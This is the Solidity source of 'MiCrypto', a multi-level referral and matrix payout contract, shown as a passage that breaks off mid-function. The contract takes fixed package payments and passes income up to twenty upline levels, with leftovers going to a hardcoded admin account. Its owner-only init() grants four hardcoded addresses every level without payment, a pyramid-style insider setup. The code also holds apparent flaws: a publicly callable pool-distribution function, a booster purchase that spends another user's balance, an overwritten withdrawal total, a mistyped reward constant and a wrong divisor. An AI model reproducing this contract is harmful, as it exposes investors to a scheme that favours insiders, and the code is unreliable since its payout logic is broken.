{"SourceCode": "//SPDX-License-Identifier: None\r\npragma solidity ^0.6.0;\r\n\r\ncontract MiCrypto {\r\n    struct User {\r\n        uint id;\r\n        uint8 rank;        \r\n        address referrer;\r\n        uint partnersCount;\r\n        uint teamCount;\r\n        uint256 directincome;\r\n        uint256 directwithdraw;\r\n        uint256 levelincome;\r\n        uint256 autopoolincome;\r\n        uint256 clubincome;        \r\n        uint256 teamincome;\r\n        uint256 boosterincome;\r\n        uint256 totalincome;\r\n        uint256 totalwithdraw;  \r\n\t\tmapping(uint8 => bool) activeLevels;\r\n        mapping(uint8 => Booster) boosterMatrix; \r\n        mapping(uint8 => AutoPool) autopoolMatrix;\r\n    }\r\n    struct HoldInfo{\r\n        uint256 directincome;\r\n        uint256 levelincome;\r\n        uint teamCount;\r\n        mapping(uint8 => uint) directhold; \r\n        mapping(uint8 => uint) levelhold;\r\n    }\r\n    mapping(address=>HoldInfo) public holdInfo;\r\n    \r\n    struct AutoPool {\r\n        address currentReferrer;\r\n        mapping(uint256=>address[]) referrals;\r\n        uint reinvestCount;\r\n    }\r\n    struct Booster {\r\n        address currentReferrer;\r\n        address[] firstLevelReferrals;\r\n        address[] secondLevelReferrals;\r\n        uint reinvestCount;\r\n    }\r\n    uint8 public constant LAST_LEVEL = 20;\r\n    mapping(address => User) public users;\r\n    mapping(uint => address) public idToAddress;\r\n    uint public lastUserId = 2;\r\n    uint256 public clubPool;\r\n    \r\n\r\n    mapping(uint256 => mapping(address => uint256)) public userLayerDayDirect5; \r\n    mapping(uint256=>address[]) public dayDirect5Users;  \r\n    \r\n    uint256 public lastDistribute;\r\n    uint256 public startTime;\r\n    uint256 private constant timeStepWeekly =10 days;\r\n\r\n    mapping(uint8 => mapping(uint256 => address)) public x6vId_number;\r\n    mapping(uint8 => uint256) public x6CurrentvId;\r\n    mapping(uint8 => uint256) public x6Index;\r\n\r\n    mapping(uint8 => mapping(uint256 => address)) public x2vId_number;\r\n    mapping(uint8 => uint256) public x2CurrentvId;\r\n    mapping(uint8 => uint256) public x2Index;\r\n    \r\n    \r\n    address public createrWallet=0x8F572e7F8375C7A1CE7401C6E96d4464Fb0a823E;\r\n    address public id1=0x9c504613ce519e138253C187172ECCADb0e5D09B;\r\n    address[4] public sponsor=[0x9c504613ce519e138253C187172ECCADb0e5D09B,0xcB71423Db570401574372642Dd4D10a2798B2C54,0x224Ac1F20b1C1d306d22014972c30cBA56b1aA25,0x577715fA8938c2Fe1628D98efBa696B644Df4e84];\r\n    address[4] public userid=[0xcB71423Db570401574372642Dd4D10a2798B2C54,0x224Ac1F20b1C1d306d22014972c30cBA56b1aA25,0x577715fA8938c2Fe1628D98efBa696B644Df4e84,0xd729e87cc49183efCD31b900DA76E094976289B8];\r\n    mapping(uint8 => uint) public directprice;\r\n    mapping(uint8 => uint) public sponsorprice; \r\n    mapping(uint8 => uint) public levelPercents;\r\n    mapping(uint8 => uint) public autopoolPrice; \r\n    mapping(uint8 => uint) public clubfund; \r\n    mapping(uint8 => uint) public packagePrice;  \r\n    mapping(uint8 => uint) public teamIncome;\r\n    mapping(uint8 => uint) public teamCount;\r\n    mapping(uint8 => uint) public directCond;\r\n    mapping(uint8 => uint) public teamdirectCond;\r\n    mapping(uint8 => uint) public levelCount;\r\n    address private creation;\r\n    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);\r\n    event Upgrade(address indexed user, uint8 level);\r\n    event Reinvest(address indexed user, address indexed currentReferrer, address indexed caller, uint8 matrix, uint8 level);    \r\n    event NewUserPlace(address indexed user, address indexed referrer, uint8 matrix, uint8 level, uint8 place);\r\n    event Transaction(address indexed user,address indexed from,uint256 value, uint8 level,uint8 Type);\r\n    event booster(address indexed user,uint256 value);\r\n    event withdraw(address indexed user,uint256 value);\r\n    constructor() public {\r\n        \r\n        directprice[1] = 5e18;\r\n        directprice[2] = 10e18;\r\n        directprice[3] = 20e18;\r\n        directprice[4] = 40e18;\r\n        directprice[5] = 50e18;\r\n        directprice[6] = 100e18;\r\n        directprice[7] = 200e18;\r\n        directprice[8] = 400e18;\r\n        directprice[9] = 800e18;\r\n        directprice[10] = 1600e18;\r\n        directprice[11] = 3200e18;\r\n        directprice[12] = 6400e18;\r\n        directprice[13] = 12800e18;\r\n        directprice[14] = 25600e18;\r\n        directprice[15] = 51200e18;\r\n        directprice[16] = 102400e18;\r\n\r\n        levelPercents[1] = 0;\r\n        levelPercents[2] = 5e17;\r\n        levelPercents[3] = 1e18;\r\n        levelPercents[4] = 2e18;\r\n        levelPercents[5] = 4e18;\r\n        levelPercents[6] = 8e18;\r\n        levelPercents[7] = 16e18;\r\n        levelPercents[8] = 32e18;\r\n        levelPercents[9] = 64e18;\r\n        levelPercents[10] = 128e18;\r\n        levelPercents[11] = 256e18;\r\n        levelPercents[12] = 512e18;\r\n        levelPercents[13] = 1024e5;\r\n        levelPercents[14] = 2048e18;\r\n        levelPercents[15] = 4096e18;\r\n        levelPercents[16] = 8192e18;\r\n\r\n        autopoolPrice[1] = 5e18;\r\n        autopoolPrice[2] = 125e16;\r\n        autopoolPrice[3] = 25e17;\r\n        autopoolPrice[4] = 5e18;\r\n        autopoolPrice[5] = 85e17;\r\n        autopoolPrice[6] = 17e18;\r\n        autopoolPrice[7] = 34e18;\r\n        autopoolPrice[8] = 60e18;\r\n        autopoolPrice[9] = 120e18;\r\n        autopoolPrice[10] = 240e18;\r\n        autopoolPrice[11] = 4266e17;\r\n        autopoolPrice[12] = 8532e17;\r\n        autopoolPrice[13] = 17064e17;\r\n        autopoolPrice[14] = 3072e18;\r\n        autopoolPrice[15] = 6144e18;\r\n        autopoolPrice[16] = 12288e18;\r\n\r\n        clubfund[1] = 0;\r\n        clubfund[2] = 4e18;\r\n        clubfund[3] = 8e18;\r\n        clubfund[4] = 16e18;\r\n        clubfund[5] = 62e18;\r\n        clubfund[6] = 124e18;\r\n        clubfund[7] = 248e18;\r\n        clubfund[8] = 496e18;\r\n        clubfund[9] = 992e18;\r\n        clubfund[10] = 1938e18;\r\n        clubfund[11] = 3968e18;\r\n        clubfund[12] = 7936e18;\r\n        clubfund[13] = 15872e18;\r\n        clubfund[14] = 31744e18;\r\n        clubfund[15] = 63488e18;\r\n        clubfund[16] = 135436e18;\r\n\r\n        packagePrice[1] = 15e18;\r\n        packagePrice[2] = 30e18;\r\n        packagePrice[3] = 60e18;\r\n        packagePrice[4] = 120e18;\r\n        packagePrice[5] = 240e18;\r\n        packagePrice[6] = 480e18;\r\n        packagePrice[7] = 960e18;\r\n        packagePrice[8] = 1920e18;\r\n        packagePrice[9] = 3840e18;\r\n        packagePrice[10] = 7680e18;\r\n        packagePrice[11] = 15360e18;\r\n        packagePrice[12] = 30720e18;\r\n        packagePrice[13] = 61440e18;\r\n        packagePrice[14] = 122880e18;\r\n        packagePrice[15] = 245760e18;\r\n        packagePrice[16] = 500000e18;\r\n\r\n        levelCount[1] = 2;\r\n        levelCount[2] = 6;\r\n        levelCount[3] = 6;\r\n        levelCount[4] = 6;\r\n        levelCount[5] = 7;\r\n        levelCount[6] = 7;\r\n        levelCount[7] = 7;\r\n        levelCount[8] = 8;\r\n        levelCount[9] = 8;\r\n        levelCount[10] = 8;\r\n        levelCount[11] = 9;\r\n        levelCount[12] = 9;\r\n        levelCount[13] = 9;\r\n        levelCount[14] = 10;\r\n        levelCount[15] = 10;\r\n        levelCount[16] = 10;\r\n        \r\n        teamIncome[1]=50e18;\r\n        teamIncome[2]=150e18;\r\n        teamIncome[3]=500e18;\r\n        teamIncome[4]=1500e18;\r\n        teamIncome[5]=5000e18;\r\n        teamIncome[6]=15000e18;\r\n        teamIncome[7]=30000e18;\r\n        teamIncome[8]=50000e18;\r\n\r\n        teamCount[1]=50;\r\n        teamCount[2]=200;\r\n        teamCount[3]=700;\r\n        teamCount[4]=2200;\r\n        teamCount[5]=7200;\r\n        teamCount[6]=22200;\r\n        teamCount[7]=52200;\r\n        teamCount[8]=102200;\r\n\r\n        teamdirectCond[1]=5;\r\n        teamdirectCond[2]=15;\r\n        teamdirectCond[3]=30;\r\n        teamdirectCond[4]=50;\r\n        teamdirectCond[5]=75;\r\n        teamdirectCond[6]=105;\r\n        teamdirectCond[7]=145;\r\n        teamdirectCond[8]=195;\r\n\r\n        creation=msg.sender;\r\n        lastDistribute = block.timestamp;\r\n        startTime = block.timestamp;\r\n        User memory user = User({\r\n            id: 1,\r\n            rank:0,\r\n            referrer: address(0),\r\n            partnersCount: uint(0),\r\n            teamCount:0,\r\n            directincome:0,\r\n            directwithdraw:0,\r\n            levelincome:0,            \r\n            autopoolincome:0,\r\n            clubincome:0,\r\n            teamincome:0,\r\n            boosterincome:0,\r\n            totalincome:0,\r\n            totalwithdraw:0\r\n        });\r\n        users[id1] = user;\r\n        idToAddress[1] = id1;\r\n        x6vId_number[1][1]=id1;\r\n        x6Index[1]=1;\r\n        x6CurrentvId[1]=1;  \r\n        for (uint8 i = 1; i <= 16; i++) {\r\n            x2vId_number[i][1]=id1;\r\n            x2Index[i]=1;\r\n            x2CurrentvId[i]=1;  \r\n            users[id1].activeLevels[i] = true;\r\n        }\r\n    }\r\n    function init() external{\r\n        require(msg.sender==creation,\"Only contract owner\"); \r\n        for (uint8 i = 0; i < 4; i++) {\r\n            registration(userid[i], sponsor[i]);\r\n            _buyNewLevel(userid[i], 2);\r\n            _buyNewLevel(userid[i], 3);\r\n            _buyNewLevel(userid[i], 4);\r\n            _buyNewLevel(userid[i], 5);\r\n            _buyNewLevel(userid[i], 6);\r\n            _buyNewLevel(userid[i], 7);\r\n            _buyNewLevel(userid[i], 8);\r\n            _buyNewLevel(userid[i], 9);\r\n            _buyNewLevel(userid[i], 10);\r\n            _buyNewLevel(userid[i], 11);\r\n            _buyNewLevel(userid[i], 12);\r\n            _buyNewLevel(userid[i], 13);\r\n            _buyNewLevel(userid[i], 14);\r\n            _buyNewLevel(userid[i], 15);\r\n            _buyNewLevel(userid[i], 16);\r\n            \r\n        }\r\n        clubPool=0;\r\n        users[id1].directwithdraw=users[id1].directincome;\r\n        users[userid[0]].directwithdraw=users[userid[0]].directincome;\r\n        users[userid[1]].directwithdraw=users[userid[1]].directincome;\r\n        users[userid[2]].directwithdraw=users[userid[2]].directincome;\r\n        users[userid[3]].directwithdraw=users[userid[3]].directincome;\r\n        users[id1].totalwithdraw=users[id1].totalincome;\r\n        users[userid[0]].totalwithdraw=users[userid[0]].totalincome;\r\n        users[userid[1]].totalwithdraw=users[userid[1]].totalincome;\r\n        users[userid[2]].totalwithdraw=users[userid[2]].totalincome;\r\n        users[userid[3]].totalwithdraw=users[userid[3]].totalincome;\r\n    }\r\n    function Invest(address referrerAddress) external payable {\r\n        require(msg.value == packagePrice[1], \"invalid price\");\r\n        registration(msg.sender, referrerAddress);\r\n    }\r\n    function InvestAnother(address userAddress,address referrerAddress) external payable{\r\n        require(msg.value == packagePrice[1], \"invalid price\");\r\n        registration(userAddress, referrerAddress);\r\n    }\r\n    \r\n    function BuyNewPackage(uint8 level) external payable{\r\n        require(msg.value == packagePrice[level], \"invalid price\");\r\n        require(isUserExists(msg.sender), \"user is not exists. Register first.\");\r\n        require(level > 1 && level <= 16, \"invalid level\");\r\n        require(!users[msg.sender].activeLevels[level], \"level already activated\");\r\n        _buyNewLevel(msg.sender, level); \r\n    }\r\n    function BuyNewPackageAnother(address userAddress,uint8 level) external payable{\r\n        require(msg.value == packagePrice[level], \"invalid price\");\r\n        require(isUserExists(userAddress), \"user is not exists. Register first.\");\r\n        require(level > 1 && level <= 16, \"invalid level\");\r\n        require(!users[userAddress].activeLevels[level], \"level already activated\");\r\n        _buyNewLevel(userAddress, level); \r\n        \r\n    }\r\n    function BuyBooster() external {\r\n        address userAddress=msg.sender;\r\n        require(!users[userAddress].activeLevels[17], \"Already exists!\");\r\n        uint256 balanceReward = users[userAddress].directincome-users[userAddress].directwithdraw;        \r\n        require(balanceReward>=15e18, \"Insufficient reward to withdraw!\");\r\n        users[userAddress].directwithdraw=15e18;\r\n        address freeBoosterReferrer = findFreeBoosterReferrer(1);\r\n        users[userAddress].boosterMatrix[1].currentReferrer = freeBoosterReferrer;\r\n        updateBoosterReferrer(userAddress, freeBoosterReferrer, 1); \r\n        users[userAddress].activeLevels[17]=true;\r\n        emit booster(userAddress,15e18);\r\n    }\r\n    function BuyBoosterAnother(address userAddress) external {\r\n        require(!users[userAddress].activeLevels[17], \"Already exists!\");\r\n        uint256 balanceReward = users[userAddress].directincome-users[userAddress].directwithdraw;        \r\n        require(balanceReward>=15e18, \"Insufficient reward to withdraw!\");\r\n        users[userAddress].directwithdraw=15e18;\r\n        address freeBoosterReferrer = findFreeBoosterReferrer(1);\r\n        users[userAddress].boosterMatrix[1].currentReferrer = freeBoosterReferrer;\r\n        updateBoosterReferrer(userAddress, freeBoosterReferrer, 1); \r\n        users[userAddress].activeLevels[17]=true;\r\n        emit booster(userAddress,15e18);\r\n    }\r\n    function registration(address userAddress, address referrerAddress) private {\r\n        require(!isUserExists(userAddress), \"user exists\");\r\n        require(isUserExists(referrerAddress), \"referrer not exists\");\r\n\r\n        User memory user = User({\r\n            id: lastUserId,\r\n            rank:0,\r\n            referrer: referrerAddress,\r\n            partnersCount: uint(0),\r\n            teamCount:0,\r\n            directincome:0,\r\n            directwithdraw:0,\r\n            levelincome:0,            \r\n            autopoolincome:0,\r\n            clubincome:0,\r\n            teamincome:0,\r\n            boosterincome:0,\r\n            totalincome:0,\r\n            totalwithdraw:0\r\n        });\r\n        \r\n        users[userAddress] = user;\r\n        idToAddress[lastUserId] = userAddress;\r\n        users[userAddress].referrer = referrerAddress;\r\n        users[userAddress].activeLevels[1] = true;\r\n        lastUserId++;\r\n        users[referrerAddress].partnersCount++;\r\n        uint256 dayNow = getCurDay();\r\n        _updateDirect5User(users[userAddress].referrer, dayNow);        \r\n        _distributelevelIncome(userAddress, directprice[1],1,true);\r\n        \r\n        address freeAutoPoolReferrer = findFreeAutoPoolReferrer(1);\r\n        users[userAddress].autopoolMatrix[1].currentReferrer = freeAutoPoolReferrer;\r\n        updateAutoPoolReferrer(userAddress, freeAutoPoolReferrer, 1);\r\n\r\n        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);\r\n    }\r\n    function _buyNewLevel(address userAddress, uint8 level) private {\r\n        users[userAddress].activeLevels[level] = true;\r\n        clubPool += clubfund[level];\r\n        releaseHoldAmount(userAddress,level);\r\n        _distributelevelIncome(userAddress, directprice[level],level,false);\r\n        \r\n        address freeAutoPoolReferrer = findFreeAutoPoolReferrer(level);\r\n        users[userAddress].autopoolMatrix[level].currentReferrer = freeAutoPoolReferrer;\r\n        updateAutoPoolReferrer(userAddress, freeAutoPoolReferrer,level);\r\n\r\n        emit Upgrade(userAddress,level);\r\n    }\r\n    function releaseHoldAmount(address userAddress, uint8 level) private {\r\n        for (uint8 i = level; i >=2; i--) {\r\n            uint256 _releasedirectamount=holdInfo[userAddress].directhold[level];\r\n            if(_releasedirectamount>0){\r\n                users[userAddress].directincome += _releasedirectamount;\r\n                holdInfo[userAddress].directhold[level]=0;\r\n            }\r\n            uint256 _releasesponsoramount=holdInfo[userAddress].levelhold[level];\r\n            if(_releasesponsoramount>0){\r\n                users[userAddress].levelincome += _releasesponsoramount;\r\n                users[userAddress].totalincome += _releasesponsoramount;\r\n                holdInfo[userAddress].levelhold[level]=0;\r\n            }\r\n            \r\n        }\r\n    }\r\n    \r\n    function _distributelevelIncome(address _user, uint256 _amount,uint8 level,bool isFromRegistration) private {\r\n        address _referrer = users[_user].referrer;    \r\n        holdInfo[_referrer].directincome += _amount;\r\n        emit Transaction(users[_user].referrer,_user,_amount,level,1);\r\n        if(users[_referrer].activeLevels[level])\r\n        {\r\n            users[_referrer].directincome += _amount;\r\n        }\r\n        else {\r\n            holdInfo[_referrer].directhold[level] += _amount;\r\n        }\r\n        if(isFromRegistration)\r\n        {\r\n            users[_referrer].teamCount++;\r\n            manageReward(_referrer);\r\n        }\r\n        if(level>1)\r\n        {\r\n            address upline = users[_referrer].referrer;        \r\n            uint8 i = 1;\r\n            for(; i <= LAST_LEVEL; i++){\r\n                if(upline != address(0)){\r\n                    if(isFromRegistration)\r\n                    {\r\n                        users[upline].teamCount++;\r\n                        manageReward(upline);\r\n                    }\r\n                    uint256 reward=i<11?levelPercents[level]:levelPercents[level]/2; \r\n                    holdInfo[upline].levelincome += reward;\r\n                    if(users[upline].activeLevels[level])\r\n                    {\r\n                        users[upline].levelincome += reward;                       \r\n                        users[upline].totalincome +=reward;\r\n                    }\r\n                    else {\r\n                        holdInfo[upline].levelhold[level] += reward;\r\n                    }\r\n                    emit Transaction(upline,_user,reward,level,2);\r\n                    upline = users[upline].referrer;\r\n                }else{\r\n                    break;\r\n                }\r\n            }\r\n            uint256 totalrestreward=0;\r\n            for(; i <= LAST_LEVEL; i++){  \r\n                uint256 reward=i<11?levelPercents[level]:levelPercents[level]/2;         \r\n                totalrestreward+=reward;          \r\n            }\r\n            users[id1].levelincome += totalrestreward;                       \r\n            users[id1].totalincome +=totalrestreward;\r\n            emit Transaction(id1,_user,totalrestreward,level,18);\r\n        }\r\n        else {\r\n            address upline = users[_referrer].referrer;        \r\n            uint8 i = 1;\r\n            for(; i <= LAST_LEVEL; i++){\r\n                if(upline != address(0)){\r\n                    if(isFromRegistration)\r\n                    {\r\n                        users[upline].teamCount++;\r\n                        manageReward(upline);\r\n                    }                \r\n                    upline = users[upline].referrer;\r\n                }else{\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n    }\r\n    function manageReward(address _user) private {\r\n        uint8 rank=users[_user].rank;\r\n        uint8 nextrank=rank+1;\r\n        if(users[_user].teamCount>=teamCount[nextrank] && users[_user].partnersCount>=teamdirectCond[nextrank] && nextrank<=8)\r\n        {\r\n            users[_user].rank=nextrank;\r\n            users[_user].teamincome+=teamIncome[nextrank];\r\n            users[_user].totalincome+=teamIncome[nextrank];\r\n            emit Transaction(_user,id1,teamIncome[nextrank],1,5);  \r\n        }\r\n        if(rank==8)\r\n        {\r\n            users[_user].teamCount=1;\r\n            users[_user].rank=0;\r\n            holdInfo[_user].teamCount+=teamCount[8];\r\n        }\r\n    }\r\n    function distributePoolRewards() public {\r\n        if(block.timestamp > lastDistribute+timeStepWeekly){  \r\n            uint256 dayNow = getCurDay();\r\n           _distributeDirectPool(dayNow);\r\n           clubPool=0;\r\n           lastDistribute = lastDistribute+timeStepWeekly;\r\n        }\r\n    }    \r\n    function getDirect5Length(uint256 _dayNow) external view returns(uint) {\r\n        return dayDirect5Users[_dayNow].length;\r\n    }    \r\n    function _distributeDirectPool(uint256 _dayNow) public {\r\n        uint256 direct5Bonus=clubPool*30/100;\r\n        uint256 direct10Bonus=clubPool*25/100;\r\n        uint256 direct15Bonus=clubPool*20/100;\r\n        uint256 direct20Bonus=clubPool*12/100;\r\n        uint256 direct25Bonus=clubPool*8/100;\r\n        uint256 direct30Bonus=clubPool*5/100;\r\n        uint8[6] memory directCount=[0,0,0,0,0,0];\r\n        for(uint256 i = 0; i < dayDirect5Users[_dayNow - 1].length; i++){\r\n            address userAddr = dayDirect5Users[_dayNow - 1][i];\r\n            if(userLayerDayDirect5[_dayNow-1][userAddr]>= 5){\r\n                directCount[0] +=1;\r\n            }\r\n            if(userLayerDayDirect5[_dayNow-1][userAddr]>= 10){\r\n                directCount[1] +=1;\r\n            }\r\n            if(userLayerDayDirect5[_dayNow-1][userAddr]>= 15){\r\n                directCount[2] +=1;\r\n            }\r\n            if(userLayerDayDirect5[_dayNow-1][userAddr]>= 20){\r\n                directCount[3] +=1;\r\n            }\r\n            if(userLayerDayDirect5[_dayNow-1][userAddr]>= 25){\r\n                directCount[4] +=1;\r\n            }\r\n            if(userLayerDayDirect5[_dayNow-1][userAddr]>= 30){\r\n                directCount[5] +=1;\r\n            }\r\n        }\r\n        if(directCount[0] > 0){\r\n            uint256 reward = direct5Bonus/directCount[0];\r\n            for(uint256 i = 0; i < dayDirect5Users[_dayNow - 1].length; i++){\r\n                address userAddr = dayDirect5Users[_dayNow - 1][i];\r\n                if(userLayerDayDirect5[_dayNow-1][userAddr]>=5 && userAddr != address(0)){\r\n                    users[userAddr].clubincome += reward;\r\n                    users[userAddr].totalincome += reward;\r\n                    emit Transaction(id1,userAddr,reward,1,4);\r\n                }\r\n            }        \r\n            direct5Bonus = 0;\r\n        }\r\n        else {\r\n            users[id1].clubincome += direct5Bonus;\r\n            users[id1].totalincome += direct5Bonus;\r\n        }\r\n        if(directCount[1] > 0){\r\n            uint256 reward = direct10Bonus/directCount[1];\r\n            for(uint256 i = 0; i < dayDirect5Users[_dayNow - 1].length; i++){\r\n                address userAddr = dayDirect5Users[_dayNow - 1][i];\r\n                if(userLayerDayDirect5[_dayNow-1][userAddr]>=10 && userAddr != address(0)){\r\n                    users[userAddr].clubincome += reward;\r\n                    users[userAddr].totalincome += reward;\r\n                    emit Transaction(id1,userAddr,reward,2,4);\r\n                }\r\n            }        \r\n            direct10Bonus = 0;\r\n        }\r\n        else {\r\n            users[id1].clubincome += direct10Bonus;\r\n            users[id1].totalincome += direct10Bonus;\r\n        }\r\n        if(directCount[2] > 0){\r\n            uint256 reward = direct15Bonus/directCount[2];\r\n            for(uint256 i = 0; i < dayDirect5Users[_dayNow - 1].length; i++){\r\n                address userAddr = dayDirect5Users[_dayNow - 1][i];\r\n                if(userLayerDayDirect5[_dayNow-1][userAddr]>=15 && userAddr != address(0)){\r\n                    users[userAddr].clubincome += reward;\r\n                    users[userAddr].totalincome += reward;\r\n                    emit Transaction(id1,userAddr,reward,3,4);\r\n                }\r\n            }        \r\n            direct15Bonus = 0;\r\n        }\r\n        else {\r\n            users[id1].clubincome += direct15Bonus;\r\n            users[id1].totalincome += direct15Bonus;\r\n        }\r\n        if(directCount[3] > 0){\r\n            uint256 reward = direct20Bonus/directCount[3];\r\n            for(uint256 i = 0; i < dayDirect5Users[_dayNow - 1].length; i++){\r\n                address userAddr = dayDirect5Users[_dayNow - 1][i];\r\n                if(userLayerDayDirect5[_dayNow-1][userAddr]>=20 && userAddr != address(0)){\r\n                    users[userAddr].clubincome += reward;\r\n                    users[userAddr].totalincome += reward;\r\n                    emit Transaction(id1,userAddr,reward,4,4);\r\n                }\r\n            }        \r\n            direct20Bonus = 0;\r\n        }\r\n        else {\r\n            users[id1].clubincome += direct20Bonus;\r\n            users[id1].totalincome += direct20Bonus;\r\n        }\r\n        if(directCount[4] > 0){\r\n            uint256 reward = direct25Bonus/directCount[4];\r\n            for(uint256 i = 0; i < dayDirect5Users[_dayNow - 1].length; i++){\r\n                address userAddr = dayDirect5Users[_dayNow - 1][i];\r\n                if(userLayerDayDirect5[_dayNow-1][userAddr]>=25 && userAddr != address(0)){\r\n                    users[userAddr].clubincome += reward;\r\n                    users[userAddr].totalincome += reward;\r\n                    emit Transaction(id1,userAddr,reward,5,4);\r\n                }\r\n            }        \r\n            direct25Bonus = 0;\r\n        }\r\n        else {\r\n            users[id1].clubincome += direct25Bonus;\r\n            users[id1].totalincome += direct25Bonus;\r\n        }\r\n        if(directCount[5] > 0){\r\n            uint256 reward = direct30Bonus/directCount[3];\r\n            for(uint256 i = 0; i < dayDirect5Users[_dayNow - 1].length; i++){\r\n                address userAddr = dayDirect5Users[_dayNow - 1][i];\r\n                if(userLayerDayDirect5[_dayNow-1][userAddr]>=30 && userAddr != address(0)){\r\n                    users[userAddr].clubincome += reward;\r\n                    users[userAddr].totalincome += reward;\r\n                    emit Transaction(id1,userAddr,reward,4,4);\r\n                }\r\n            }        \r\n            direct30Bonus = 0;\r\n        }\r\n        else {\r\n            users[id1].clubincome += direct30Bonus;\r\n            users[id1].totalincome += direct30Bonus;\r\n        }\r\n    }\r\n\tfunction usersActiveLevels(address userAddress, uint8 level) public view returns(bool) {\r\n        return users[userAddress].activeLevels[level];\r\n    }\r\n    function usersDirectHold(address userAddress, uint8 level) public view returns(uint256) {\r\n        return holdInfo[userAddress].directhold[level];\r\n    }\r\n    function usersLevelHold(address userAddress, uint8 level) public view returns(uint256) {\r\n        return holdInfo[userAddress].levelhold[level];\r\n    }\r\n    function findFreeAutoPoolReferrer(uint8 level) public view returns(address){\r\n            uint256 id=x2CurrentvId[level];\r\n            return x2vId_number[level][id];\r\n    } \r\n    function findFreeBoosterReferrer(uint8 level) public view returns(address){\r\n            uint256 id=x6CurrentvId[level];\r\n            return x6vId_number[level][id];\r\n    } \r\n    function getWithdrawable(address userAddress) public view returns(uint256){  \r\n        return (users[userAddress].totalincome - users[userAddress].totalwithdraw);\r\n    }\r\n    function usersAutoPool(address userAddress, uint8 level,uint8 step) public view returns(address, address[] memory,uint256) {\r\n        return (users[userAddress].autopoolMatrix[level].currentReferrer,\r\n                users[userAddress].autopoolMatrix[level].referrals[step],users[userAddress].autopoolMatrix[level].reinvestCount);\r\n    }\r\n    function usersBooster(address userAddress, uint8 level) public view returns(address, address[] memory,uint256) {\r\n        return (users[userAddress].boosterMatrix[level].currentReferrer,\r\n                users[userAddress].boosterMatrix[level].firstLevelReferrals,users[userAddress].boosterMatrix[level].reinvestCount);\r\n    }\r\n    function isUserExists(address user) public view returns (bool) {\r\n        return (users[user].id != 0);\r\n    }\r\n    function updateAutoPoolReferrer(address userAddress, address referrerAddress, uint8 level) private{\r\n        uint256 newIndex=x2Index[level]+1;\r\n        x2vId_number[level][newIndex]=userAddress;\r\n        x2Index[level]=newIndex;\r\n        address upline = referrerAddress;\r\n        uint place=0;\r\n        uint levelcount=levelCount[level];\r\n        for(uint i=1; i <= levelcount; i++){\r\n            users[upline].autopoolMatrix[level].referrals[i].push(userAddress); \r\n            if (users[upline].autopoolMatrix[level].referrals[1].length == 2 && i==1) {\r\n                x2CurrentvId[level]=x2CurrentvId[level]+1;\r\n            }  \r\n            uint leveluser = 2**i;\r\n            place +=i==1?0:2**(i-1);\r\n            emit NewUserPlace(userAddress, upline,1, level,uint8(place)+ uint8(users[upline].autopoolMatrix[level].referrals[i].length));\r\n            if (users[upline].autopoolMatrix[level].referrals[i].length == leveluser) {\r\n                \r\n                uint256 autopoolincome=leveluser<(2**levelcount)?autopoolPrice[level]*leveluser:(autopoolPrice[level]*leveluser-packagePrice[level]);\r\n\r\n                users[upline].autopoolincome +=autopoolincome;                     \r\n                users[upline].totalincome +=autopoolincome;                \r\n                emit Transaction(upline,userAddress,autopoolincome,1,3);  \r\n\r\n                if(leveluser==(2**levelcount))  \r\n                {                \r\n                    clubPool += clubfund[level];\r\n                    _distributelevelIncome(upline, directprice[level],level,false);    \r\n                    users[upline].autopoolMatrix[level].reinvestCount++;\r\n                    for(uint k=1; k <= levelcount; k++){\r\n                        users[upline].autopoolMatrix[level].referrals[k] = new address[](0);\r\n                    }\r\n                    address freeAutoPoolReferrer = findFreeAutoPoolReferrer(level);\r\n                    users[upline].autopoolMatrix[level].currentReferrer = freeAutoPoolReferrer;\r\n                    updateAutoPoolReferrer(upline, freeAutoPoolReferrer,level);\r\n                    emit Reinvest(upline, freeAutoPoolReferrer, userAddress, 1, level);\r\n                }    \r\n\r\n            }\r\n            if(upline!=id1){\r\n                upline = users[upline].autopoolMatrix[level].currentReferrer;\r\n            }\r\n            else {\r\n                break;\r\n            }  \r\n        }      \r\n    }   \r\n    function updateBoosterReferrer(address userAddress, address referrerAddress, uint8 level) private{\r\n        uint256 newIndex=x6Index[level]+1;\r\n        x6vId_number[level][newIndex]=userAddress;\r\n        x6Index[level]=newIndex;\r\n        users[referrerAddress].boosterMatrix[level].firstLevelReferrals.push(userAddress);        \r\n        if (users[referrerAddress].boosterMatrix[level].firstLevelReferrals.length < 2) {\r\n            emit NewUserPlace(userAddress, referrerAddress, 2, level, uint8(users[referrerAddress].boosterMatrix[level].firstLevelReferrals.length));\r\n            if (referrerAddress == id1) {                \r\n                return;\r\n            }\r\n            address ref = users[referrerAddress].boosterMatrix[level].currentReferrer;            \r\n            users[ref].boosterMatrix[level].secondLevelReferrals.push(userAddress);\r\n            emit NewUserPlace(userAddress, ref, 2, level, 2 + uint8(users[ref].boosterMatrix[level].secondLevelReferrals.length));            \r\n            return;\r\n            \r\n        }\r\n        emit NewUserPlace(userAddress, referrerAddress, 2, level, 2);\r\n        x6CurrentvId[level]=x6CurrentvId[level]+1;\r\n        if (referrerAddress == id1) {\r\n            return;\r\n        }\r\n        address ref = users[referrerAddress].boosterMatrix[level].currentReferrer;            \r\n        users[ref].boosterMatrix[level].secondLevelReferrals.push(userAddress);\r\n        if (users[ref].boosterMatrix[level].secondLevelReferrals.length < 4) {\r\n            emit NewUserPlace(userAddress, ref, 2, level, 2+uint8(users[ref].boosterMatrix[level].secondLevelReferrals.length));\r\n            return;\r\n        }\r\n        emit NewUserPlace(userAddress, ref, 2, level, 6);\r\n        users[ref].boosterincome +=35e18;                     \r\n        users[ref].totalincome +=35e18;\r\n        emit Transaction(ref,userAddress,35e18,1,6);\r\n\t\tusers[ref].boosterMatrix[level].reinvestCount++;\r\n        users[ref].boosterMatrix[level].firstLevelReferrals = new address[](0);\r\n        users[ref].boosterMatrix[level].secondLevelReferrals = new address[](0);\r\n        address freeReferrerAddress = findFreeBoosterReferrer(level);\r\n        if (users[ref].boosterMatrix[level].currentReferrer != freeReferrerAddress) {\r\n            users[ref].boosterMatrix[level].currentReferrer = freeReferrerAddress;\r\n        }\r\n        emit Reinvest(ref, freeReferrerAddress, userAddress, 2, level);\r\n        updateBoosterReferrer(ref, freeReferrerAddress, level);\r\n    }\r\n    \r\n    function _updateDirect5User(address _user, uint256 _dayNow) private {\r\n        userLayerDayDirect5[_dayNow][_user] += 1;\r\n        bool updated;\r\n        for(uint256 i = 0; i < dayDirect5Users[_dayNow].length; i++){\r\n            address direct3User = 